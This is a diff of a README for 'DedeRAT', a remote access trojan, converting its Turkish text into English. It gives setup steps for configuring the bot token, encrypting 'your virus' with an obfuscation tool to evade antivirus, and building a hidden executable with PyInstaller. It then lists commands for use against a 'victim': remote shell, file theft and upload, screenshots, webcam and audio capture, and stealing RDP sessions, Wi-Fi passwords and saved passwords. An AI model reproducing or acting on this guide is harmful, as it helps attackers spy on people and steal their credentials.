@@ -1,16 +1,25 @@
+
 # DedeRAT
 
-Bu RAT, Türk mitolojisinden Dede Korkut'tan esinlenerek yapılmıştır. İlk RAT projemdir. Umarım beğenirsiniz.
+This RAT made inspired by Dede Korkut from Turkish mitology. My first RAT project. I hope you will like this.
 
-# Kurulum
+# Installation
 
-- Git veya zip olarak indirin.
-- 'config.py' dosyasını bir metin düzenleyicide açın.
-- "serverid" ve "bottoken" değerlerini kendi bilgilerinize göre değiştirin.
-- "NMSFUD" klasörünü açın ve "NMSFUD V3.5" dosyasını açın. Python dosyasını seçip virüsünüzü şifreleyin.
-- PyInstaller kullanarak exe dosyasına dönüştürün (iconpack içindeki simgeleri kullanabilirsiniz).
 
-## Komut Örnekleri
+
+# DedeRAT
+
+This RAT made inspired by Dede Korkut from Turkish mitology. My first RAT project. I hope you will like this.
+
+# Installation
+
+- Install it as git or zip
+- Open 'config.py' in a text editor.
+- Change "serverid" and "bottoken" according to your values
+- Open the "NMSFUD" folder and open "NMSFUD V3.5" file. Select Python file and crypt the your virus.
+- Turn this to exe using pyinstaller (You can use icons in util/iconpack)
+
+## Command Examples
 
 ```pyinstaller --onefile --noconsole -i util/iconspack/iconname.ico -n virus config.py```
 
@@ -18,35 +27,62 @@ Bu RAT, Türk mitolojisinden Dede Korkut'tan esinlenerek yapılmıştır. İlk R
 
 ```pyinstaller --onefile --noconsole config.py```
 
-# Komutlar
+# Commands
 
-- **cd** - Dizin değiştirir. Kullanım: cd C:\tam\yol\of\directory
-- **pwd** - Mevcut dizini gösterir.
-- **delet** - Bir dosyayı siler.
-- **download** - Kurbanın bilgisayarından bir dosyayı indirir. Kullanım: download C:\tam\yol\of\directory
-- **msgbox** - Bir mesaj kutusu gösterir. Kullanım: msgbox -msg Mesaj -ttl Başlık
-- **record** - Belirtilen süre kadar kayıt yapar. Kullanım: record 10 (10, saniye sayısıdır)
-- **setbg** - Bir fotoğraf yükleyerek arka planı değiştirir.
-- **shell** - CMD komutlarını çalıştırır. Kullanım: shell dir
-- **ss** - Ekran görüntüsü alır.
-- **stealrdp** - RDP oturum bilgilerini çalar.
-- **sysinfo** - Sistem bilgilerini okur.
-- **upload** - Kurbanın bilgisayarına bir dosya yükler. Kullanım: upload C:\tam\yol\of\your\wish (bir dosya ekleyin)
-- **capsrandtroll** - Metin büyük/küçük harflerini rastgele değiştirir. Kullanım: capsrandtroll 10 (10, saniye sayısıdır)
-- **visitsite** - Belirtilen siteyi ziyaret eder.
-- **shutdown** - Kurbanın bilgisayarını kapatır.
-- **tasklist** - Kurbanın PC'sindeki açık programları listeler.
-- **taskkill** - Kurbanın PC'sindeki bir programı veya oyunu kapatır.
-- **write** - Kurbanın PC'sine bir cümle yazar.
-- **moveto** - Kurbanın farenizi hareket ettirir. Kullanım: moveto 100, 300 (100 ve 300, x ve y koordinatlarıdır)
-- **webcamlist** - Mevcut web kameraları listeler.
-- **cameraphoto** - Web kameradan bir fotoğraf çeker.
-- **execute** - Bir dosyayı çalıştırır. Kullanım: execute <path>
-- **recordvideo** - Belirtilen süre kadar video kaydeder. Kullanım: recordvideo 10.0 (10.0, süreyi saniye olarak belirtir)
-- **wifipasswords** - Kaydedilen Wi-Fi ağlarını ve şifrelerini listeler.
-- **grab** - Kurbanın şifrelerini çeker.
+cd - Change directory. Usage: cd C:\full\path\of\directory
 
-# Teşekkürler:
+pwd - See the current directory.
+
+delet - Remove a file.
+
+download - Download a file from the victim's computer. Usage: 
+
+download C:\full\path\of\directory
+
+msgbox - Show a message box. Usage: msgbox -msg Message -ttl Title
+
+record - Record for a specified time. Usage: record 10 (where 10 is the number of seconds)
+
+setbg - Upload a photo to change the background.
+
+shell - Execute CMD commands. Usage: shell dir
+
+ss - Take a screenshot.
+
+stealrdp - Steal RDP session information.
+
+sysinfo - Read system information.
+
+upload - Upload a file to the victim. Usage: upload C:\full\path\of\your\wish (attach a file)
+
+capsrandtroll - Randomize text case to troll. Usage: capsrandtroll 10 (where 10 is the number of seconds)
+
+visitsite - Visit a specified site.
+
+shutdown - Shutdown the victim's computer.
+
+tasklist - List open programs on the victim's PC.
+
+taskkill - Close a program or game on the victim's PC.
+
+write - Write a sentence on the victim's PC.
+
+moveto - Move the victim's mouse. Usage: moveto 100, 300 
+(where 100 and 300 are x and y coordinates)
+
+webcamlist - List available webcams.
+
+cameraphoto - Take a photo with the webcam.
+
+execute - Execute a file. Usage: execute <path>
+
+recordvideo - Record a video for a specified time. Usage: recordvideo 10.0 (where 10.0 is the duration in seconds as a float)
+
+wifipasswords - List saved Wi-Fi networks and passwords.
+
+grab - Grab the victim's passwords.
+
+# Thanks To :
 
 - LydexCoding
 - NMS
